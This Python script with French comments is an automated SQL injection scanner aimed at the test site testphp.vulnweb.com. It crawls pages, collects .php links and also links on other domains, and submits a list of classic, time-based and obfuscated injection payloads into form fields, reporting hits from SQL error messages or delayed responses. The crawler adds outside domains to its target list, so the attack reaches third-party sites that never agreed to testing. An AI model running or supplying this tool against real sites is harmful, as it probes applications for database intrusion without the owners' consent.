import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
import time

# Configuration
TARGET_URL = "http://testphp.vulnweb.com"  # URL cible
TARGET_URLS = []

# Payloads SQLi classiques et time-based
SQLI_PAYLOADS = [
    "'", "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'--'", 
    "' UNION SELECT null, version()--", "' AND SLEEP(7)--", "' OR SLEEP(5)--",
    "' OR IF(1=1, SLEEP(5), 0)--", "' OR IF(1=1, BENCHMARK(1000000,MD5(1)), 0)--",
    "' OR CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END--",
    "' OR CHAR(83,76,69,69,80,40,53,41)--", "' OR CONCAT('SLE','EP(5)')--"
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
}

def get_external_links(url):
    """Récupère tous les liens externes et internes en .php"""
    try:
        response = requests.get(url, headers=HEADERS, timeout=5)
        response.raise_for_status()
    except requests.exceptions.RequestException:
        return set()

    soup = BeautifulSoup(response.text, 'html.parser')
    base_domain = urlparse(url).netloc
    external_links = set()

    for link in soup.find_all("a", href=True):
        href = link["href"]
        full_url = urljoin(url, href)
        parsed_url = urlparse(full_url)

        # Inclure les liens PHP relatifs et les liens externes
        if parsed_url.path.endswith(".php") or (parsed_url.netloc and parsed_url.netloc != base_domain):
            external_links.add(full_url)

    return external_links

def find_forms(url):
    """Récupère tous les formulaires d'une page"""
    try:
        response = requests.get(url, headers=HEADERS, timeout=5)
        response.raise_for_status()
    except requests.exceptions.RequestException:
        return []

    soup = BeautifulSoup(response.text, 'html.parser')
    return soup.find_all('form')

def get_form_details(forms):
    """Extrait les détails des formulaires"""
    form_details = []
    for form in forms:
        details = {
            "action": form.get("action") or "",  # Éviter les valeurs None
            "method": form.get("method", "get").lower(),
            "inputs": [{"name": i.get("name"), "type": i.get("type", "text")} for i in form.find_all("input")]
        }
        form_details.append(details)
    return form_details

def get_unique_forms(forms):
    """Évite les doublons de formulaires"""
    unique_forms = set()
    filtered_forms = []

    for form in forms:
        form_signature = (
            form.get("action") or "",
            form.get("method", "get").lower(),
            tuple((input_tag.get("name"), input_tag.get("type", "text")) for input_tag in form.find_all("input"))
        )

        if form_signature not in unique_forms:
            unique_forms.add(form_signature)
            filtered_forms.append(form)

    return filtered_forms

def test_sqli(url, form_details):
    """Test d'injection SQL"""
    print(f"\n[🛠️] Test SQLi sur : {url}")

    for payload in SQLI_PAYLOADS:
        data = {input_tag["name"]: payload if input_tag["type"] in ["text", "password"] else "test"
                for input_tag in form_details["inputs"] if input_tag["name"]}

        action_url = urljoin(url, form_details["action"])
        method = form_details["method"]

        try:
            start_time = time.time()
            response = requests.post(action_url, data=data, headers=HEADERS, timeout=5) if method == "post" else \
                       requests.get(action_url, params=data, headers=HEADERS, timeout=5)
            elapsed_time = time.time() - start_time
        except requests.exceptions.RequestException:
            continue

        # Détection d'erreurs SQL classiques
        error_signatures = ["SQL syntax", "mysql_fetch", "You have an error in your SQL syntax", "Warning: mysql"]
        if any(error in response.text for error in error_signatures):
            print(f"  [🔥] SQLi détectée avec payload : {payload}")
            return  # Arrête de tester les autres payloads si une faille est détectée

        # Détection Time-Based Blind SQLi
        if "SLEEP(5)" in payload and elapsed_time > 4:
            print(f"  [⏳] SQLi Blind détectée avec payload : {payload} (temps : {elapsed_time:.2f}s)")
            return  # Arrête de tester les autres payloads si une faille est détectée

def lancer_attaque_sqli():
    """ Lance l'attaque SQLi sur toutes les pages trouvées"""
    for url in TARGET_URLS:
        print(f"\n[-+-] Analyse des formulaires sur {url}...")
        forms = get_unique_forms(find_forms(url))

        if not forms:
            print(f"    [-] Aucun formulaire trouvé sur {url}")
            continue

        print(f"    [+] {len(forms)} formulaire(s) unique(s) trouvé(s) !")
        form_details_list = get_form_details(forms)

        for form_details in form_details_list:
            test_sqli(url, form_details)

# Recherche des liens externes
external_links = get_external_links(TARGET_URL)

if external_links:
    print("\n[🌍] Liens trouvés :")
    for link in external_links:
        print(f"  ➡️ {link}")
else:
    print("[❌] Aucun lien trouvé. Vérifie que la page contient des liens externes !")

# Ajoute les liens trouvés à la liste des cibles et lance l'attaque SQLi
TARGET_URLS.extend(external_links)
lancer_attaque_sqli()
